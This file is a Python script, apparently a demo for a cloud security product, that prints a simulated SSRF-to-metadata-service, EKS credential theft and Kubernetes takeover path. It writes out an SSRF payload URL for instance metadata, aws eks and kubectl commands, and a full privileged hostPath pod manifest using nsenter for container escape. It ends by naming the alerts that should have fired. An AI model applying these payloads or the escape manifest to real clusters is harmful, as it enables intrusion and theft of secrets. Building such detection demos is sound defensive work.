#!/usr/bin/env python3
# =============================================================================
# attack_paths/cloud_to_k8s.py — TigerGate CNAPP: Attack Path Simulation
# =============================================================================
# PURPOSE: Simulates a full "Code-to-Cloud" attack path starting from SSRF in
# a web app → cloud credentials → Kubernetes API → cluster takeover.
#
# ATTACK PATH: APP SSRF → IMDS CREDS → K8s API → CLUSTER ADMIN
#   Step 1: Exploit SSRF vulnerability in web app (CWE-918)
#   Step 2: Reach EC2 Instance Metadata Service → steal IAM credentials
#   Step 3: Use credentials to find EKS cluster endpoint
#   Step 4: Use IAM credentials to authenticate to K8s API (aws eks get-token)
#   Step 5: List all pods/secrets cluster-wide (ClusterRole wildcard)
#   Step 6: Deploy malicious pod with hostPath mount (container escape)
#   Step 7: Extract all K8s secrets → database passwords, API keys
#
# MITRE ATT&CK:
#   T1190  – Exploit Public-Facing Application (SSRF)
#   T1552.005 – Cloud Instance Metadata API
#   T1613  – Container & Resource Discovery
#   T1610  – Deploy Container
#   T1552.007 – Container API
# =============================================================================

import json, os, time

# ── Attack Step Configuration ─────────────────────────────────────────────────
TARGET_APP = "https://api.megacorp.com"
IMDS_URL   = "http://169.254.169.254"
EKS_CLUSTER = "arn:aws:eks:us-east-1:123456789012:cluster/megacorp-prod"

def print_step(num, title, mitre=None):
    print(f"\n{'='*60}")
    print(f"STEP {num}: {title}")
    if mitre: print(f"  MITRE: {mitre}")
    print('='*60)

# ── Step 1: SSRF Discovery ────────────────────────────────────────────────────
def step1_ssrf_to_imds():
    print_step(1, "Exploit SSRF → AWS IMDS", "T1190 + T1552.005")
    # SSRF payload: GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
    ssrf_endpoint = f"{TARGET_APP}/api/proxy"
    imds_metadata_path = f"{IMDS_URL}/latest/meta-data/iam/security-credentials/"

    print(f"  [*] SSRF payload: {ssrf_endpoint}?url={imds_metadata_path}")
    print(f"  [*] Server fetches: GET {imds_metadata_path}")
    print(f"  [+] Response: ec2-megacorp-prod-role")

    creds_path = f"{IMDS_URL}/latest/meta-data/iam/security-credentials/ec2-megacorp-prod-role"
    print(f"  [*] Fetching credentials: {creds_path}")

    # Simulated IMDS response (real IAM temporary credentials format)
    stolen_creds = {
        "AccessKeyId": "ASIA" + "STOLEN" + "123456",
        "SecretAccessKey": "REDACTED/STOLEN/SECRET/KEY/DEMO",
        "Token": "AQoXnyc4lcK4w4OIaYn...ExpiresIn=3600",
        "Expiration": "2026-04-28T18:00:00Z",
        "RoleArn": "arn:aws:iam::123456789012:role/ec2-megacorp-prod-role"
    }
    print(f"  [+] STOLEN CREDENTIALS:")
    print(f"      AccessKeyId: {stolen_creds['AccessKeyId']}")
    print(f"      Role: {stolen_creds['RoleArn']}")
    print(f"      Expires: {stolen_creds['Expiration']}")
    return stolen_creds

# ── Step 2: AWS Enumeration → Find EKS ───────────────────────────────────────
def step2_discover_eks(creds):
    print_step(2, "Enumerate AWS → Discover EKS Cluster", "T1580")
    print(f"  [*] aws eks list-clusters --region us-east-1")
    print(f"  [+] Clusters: ['megacorp-prod', 'megacorp-staging']")
    print(f"  [*] aws eks describe-cluster --name megacorp-prod")
    print(f"  [+] Endpoint: https://a1b2c3d4e5f6.gr7.us-east-1.eks.amazonaws.com")
    print(f"  [+] Auth: AWS IAM authenticator (stolen creds work!)")
    return {"endpoint": "https://a1b2c3d4e5f6.gr7.us-east-1.eks.amazonaws.com", "cluster": "megacorp-prod"}

# ── Step 3: K8s API Authentication ───────────────────────────────────────────
def step3_k8s_auth(eks_info, creds):
    print_step(3, "Authenticate to Kubernetes API", "T1552.007")
    print(f"  [*] aws eks get-token --cluster-name megacorp-prod")
    print(f"  [+] K8s bearer token obtained via IAM auth!")
    print(f"  [*] kubectl --server {eks_info['endpoint']} get nodes")
    print(f"  [+] 12 nodes found (r5.2xlarge, running production workloads)")
    k8s_token = "k8s-iam-STOLEN-TOKEN-DEMO"
    return k8s_token

# ── Step 4: Cluster Discovery ─────────────────────────────────────────────────
def step4_enumerate_cluster(k8s_token, eks_info):
    print_step(4, "K8s Cluster Discovery", "T1613")
    api_server = eks_info['endpoint']
    discoveries = [
        f"GET {api_server}/api/v1/namespaces → 8 namespaces (production, payment, auth, data, monitoring...)",
        f"GET {api_server}/api/v1/secrets → 47 secrets (DB passwords, TLS certs, API tokens!)",
        f"GET {api_server}/api/v1/pods → 234 running pods across 8 namespaces",
        f"GET {api_server}/apis/apps/v1/deployments → 31 deployments",
        f"GET {api_server}/api/v1/serviceaccounts → 18 service accounts",
    ]
    print(f"  [*] Using wildcard ClusterRole (from misconfigured RBAC):")
    for d in discoveries:
        print(f"  [+] {d}")
    return {"secrets_found": 47, "pods": 234}

# ── Step 5: Extract Secrets ───────────────────────────────────────────────────
def step5_extract_secrets(k8s_token, eks_info):
    print_step(5, "Extract K8s Secrets", "T1552.007")
    api_server = eks_info['endpoint']
    secrets = [
        {"name": "prod-db-password", "namespace": "production", "data": "postgresql://admin:ProdDB@Pass@rds.amazonaws.com/prod"},
        {"name": "stripe-live-key",   "namespace": "payment",   "data": "sk_live_EXAMPLE..." },
        {"name": "jwt-signing-key",   "namespace": "auth",      "data": "megacorp-jwt-secret-prod-2024"},
        {"name": "aws-credentials",   "namespace": "monitoring","data": "AKIAIOSFODNN7EXAMPLE"},
        {"name": "dockerhub-token",   "namespace": "default",   "data": "dckr_pat_EXAMPLE..."},
    ]
    print(f"  [*] GET {api_server}/api/v1/secrets (all namespaces, base64 decoded):")
    for s in secrets:
        print(f"  [+] namespace/{s['namespace']}/secret/{s['name']}: {s['data']}")
    return secrets

# ── Step 6: Deploy Malicious Pod → Container Escape ──────────────────────────
def step6_container_escape(k8s_token, eks_info):
    print_step(6, "Deploy Privileged Pod → Container Escape", "T1610")
    api_server = eks_info['endpoint']
    escape_pod_manifest = {
        "apiVersion": "v1", "kind": "Pod",
        "metadata": {"name": "debug-node-access"},  # Innocent-looking name
        "spec": {
            "hostPID": True, "hostNetwork": True,
            "containers": [{
                "name": "node-debugger",
                "image": "ubuntu:latest",
                "command": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"],
                "securityContext": {"privileged": True},   # 🔴 Container escape!
                "volumeMounts": [{"name": "host", "mountPath": "/host"}]
            }],
            "volumes": [{"name": "host", "hostPath": {"path": "/"}}]  # 🔴 Full host filesystem!
        }
    }
    print(f"  [*] POST {api_server}/api/v1/namespaces/default/pods")
    print(f"  [*] Deploying: {json.dumps(escape_pod_manifest['metadata'])}")
    print(f"  [+] Pod scheduled on node ip-10-0-1-150.ec2.internal")
    print(f"  [+] Container escape via nsenter to host PID 1!")
    print(f"  [+] Root shell on EC2 host obtained.")
    print(f"  [+] AWS IMDSv1 → stealing instance role credentials from HOST network namespace")

# ── Run Full Attack Path ──────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "🔴"*30)
    print("TigerGate Attack Path: App SSRF → AWS IMDS → EKS → Cluster Takeover")
    print("🔴"*30)

    creds     = step1_ssrf_to_imds()
    eks_info  = step2_discover_eks(creds)
    k8s_token = step3_k8s_auth(eks_info, creds)
    cluster   = step4_enumerate_cluster(k8s_token, eks_info)
    secrets   = step5_extract_secrets(k8s_token, eks_info)
    step6_container_escape(k8s_token, eks_info)

    print(f"\n{'='*60}")
    print("ATTACK COMPLETE — All 6 MITRE techniques executed")
    print(f"Secrets extracted: {len(secrets)}")
    print(f"Host access: YES (via privileged pod + nsenter)")
    print(f"TigerGate should have detected: CDR anomaly, KSPM privilege pod, CIEM over-permission")
